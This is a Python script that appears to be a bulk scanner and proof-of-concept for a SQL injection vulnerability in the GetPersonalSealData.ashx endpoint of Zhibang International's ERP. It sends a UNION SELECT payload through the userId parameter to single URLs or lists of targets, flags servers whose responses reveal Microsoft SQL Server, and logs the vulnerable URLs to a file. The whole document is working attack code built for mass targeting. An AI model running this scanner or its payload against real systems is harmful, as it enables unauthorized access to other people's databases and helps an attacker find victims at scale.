import requests
import argparse
import time
import warnings
warnings.filterwarnings("ignore")
# 漏洞payload
payload=r"/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--"
# 漏洞名称
vul_name="智邦国际ERP GetPersonalSealData.ashx接口SQL注入漏洞"

def get_time():
    mtime=time.strftime("%Y-%m-%d %H:%M:%S",time.localtime())
    # assert isinstance(mtime, str)
    # assert len(mtime) == 19
    return mtime

def print_colored(text, color):
    colors = {
        'black': '\033[0;30m',
        'red': '\033[0;31m',
        'green': '\033[0;32m',
        'yellow': '\033[0;33m',
        'blue': '\033[0;34m',
        'purple': '\033[0;35m',
        'cyan': '\033[0;36m',
        'white': '\033[0;37m'
    }
    reset = '\033[0m'
    if color in colors:
        colored_text = colors[color] + text + reset
        print(colored_text,end='')
    else:
        print(text,end='')
     
def send_request(url):
    try:   
        response=requests.get(f"{url}{payload}",timeout=10)
        if response.status_code==200:
            content=response.text
            if "Microsoft SQL Server" in content:
                print_colored(f'[+] {get_time()} {url} 存在{vul_name} ','green')
                print_colored(f"漏洞路径 {url+payload}\n",'yellow')
                res=f"漏洞路径 {url+payload}"
                return res
            else:
                print_colored(f'[-] {get_time()} {url} 不存在{vul_name}\n ','red')
    except Exception as e:
        print_colored(f"[-] {get_time()} {url} 请求超时\n","red")
        
def main():
    parser = argparse.ArgumentParser(description='命令行参数示例')
    # 添加参数选项
    parser.add_argument('-u', '--url', type=str, help='单个url')
    parser.add_argument('-f', '--file', type=str, help='url文本文件路径')
    parser.add_argument('-o', '--output', type=str, help='保存结果')
    # 解析命令行参数
    args = parser.parse_args()
    
    if args.url:
        send_request(args.url)
    if args.file:
        with open(args.file,'r') as f1:
            fs=f1.readlines()
            count=0
            for u in fs:
                url=u.strip()
                res=send_request(url)
                if args.output:
                    with open(args.output+f"/{vul_name}.txt",'a+',encoding='utf-8') as f2:
                        if res==None:
                            pass
                        else:
                            f2.write(f"{res}\n")
    
main()